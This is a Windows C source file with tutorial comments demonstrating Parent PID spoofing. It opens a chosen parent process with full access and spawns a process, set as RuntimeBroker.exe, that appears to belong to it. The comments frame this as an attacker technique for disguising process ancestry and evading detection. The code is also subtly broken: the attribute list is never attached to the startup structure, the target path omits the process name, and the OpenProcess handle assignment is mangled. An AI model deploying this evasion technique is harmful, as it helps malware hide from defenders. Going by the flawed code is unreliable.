/*
Explaination:
	- Process ID (PID) is a unique number that identifies any process currently running on the OS. When a process spawns another process, it becomes a parent process, and the spawned prcess becomes a child process.
	- Parent PID Spoofing is a technique that allows attackers to run processes under any parent process. The child process can have the Parent Process ID

Requirements:
	- Attributes list -> Stores a list of attributes associated with a process or thread. These attributes include information such as the priority, state, CPU affinity and meory address space of the process/thread.
	- PPID Spoofing requires the use and manipulation of a process attributes list to modify its PPID.
	- CreateProcess with EXTENDED_STARTUPINFON_PRESENT flag, allows us to give more control on the process (modify its PPID)
	- STARTUPINFOEXA -> structure for lpStartInfo
*/

/*
Familiarize yourself with a process's attributes list and understand how to initialize and update them
*/
#include <Windows.h>
#include <stdio.h>
#pragma warning (disable:4996)
#define T_Process "RuntimeBroker.exe -Embedding"

/*
Function - Creates new process and forcing Parent Process to like like its parent
*/


/*
Function: PPID_Spoofing
Description: Creates a new process and makes it appear as if it belongs to the same parent process.

Parameters:
- hParentProcess (IN): Handle to the parent process.
- lpProcessName (IN): The name of the process to be created.
- dwProcessId (OUT): Pointer to store the process ID of the newly created process.
- hProcess (OUT): Pointer to store the handle of the newly created process.
- hThread (OUT): Pointer to store the handle of the primary thread of the newly created process.
*/

BOOL PPID_Spoofing(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    // Forward Declarations

    // Set the maximum path length for various character arrays
    CHAR lpPath[MAX_PATH * 2];
    CHAR CurrentDirectory[MAX_PATH];
    CHAR WinDir[MAX_PATH];

    // Size in bytes required for the ThreadAttributeList
    SIZE_T sThreadAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Initialize the structs (setting element values to 0)
    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Set the size of the structure
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEX);

    // Set the current working directory
    if (!GetEnvironmentVariableA("WinDir", WinDir, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error Code: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Successfully Set Current Working Directory\n");

    // Construct the full target path of the user provided process
    sprintf(lpPath, "%s\\System32\\", WinDir);

    // Set the current directory
    sprintf(CurrentDirectory, "%s\\System32\\", WinDir);

    // Determine the size of the attribute list
    // First Parameter -> Determine the buffer size required to support the number of attributes.
    // Second Parameter -> The count of attributes that we want to add; we only have to add 1 attribute key.
    // Third Parameter -> Reserved parameter.
    // Fourth Parameter -> Size of lpAttributeList
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

    // Allocating Memory 
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] Allocated Memory At: 0x%p \n", pThreadAttList);

    // Initlize it again, this time with the correct parameters
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &sThreadAttList)) {
        printf("[!] InitializeProcThreadAttributeList Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] ProcThread Set!\n");
    if (!UpdateProcThreadAttribute(pThreadAttList, 1, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute Failed With Error Code: %d \n", GetLastError());
            return FALSE;
    }

    // setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was created using `UpdateProcThreadAttribute` - that is the parent process
    if (SiEx.lpAttributeList == pThreadAttList) {
        printf("[+] Setting UpdateProc Equal To SiEx");
    }

    printf("[i] Running : \"%s\" ... ", lpPath);

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        CurrentDirectory,
        &SiEx.StartupInfo,
        &Pi)) {
        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE \n");


    // filling up the OUTPUT parameter with 'CreateProcessA's output'
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;


    // cleaning up
    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    // doing a small check to verify we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("[!] Missing \"Parent Process Id\" Argument \n");
        return -1;
    }
    DWORD		dwPPid = atoi(argv[1]),
                dwProcessId = NULL;

    HANDLE		hPProcess = NULL,
                hProcess = NULL,
                hThread = NULL;

    if (hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid) == NULL) {
        printf("[!] OpenProcess Failed With Error Code: %d", GetLastError());
        return -1;
    }
    printf("[+] Spawning Target Process \"%s\" With Parent : %d \n", T_Process, dwPPid);
    if (!PPID_Spoofing(hPProcess, T_Process, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }

    printf("[+] Press <Enter> To Quit ... \N");
    getchar();
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}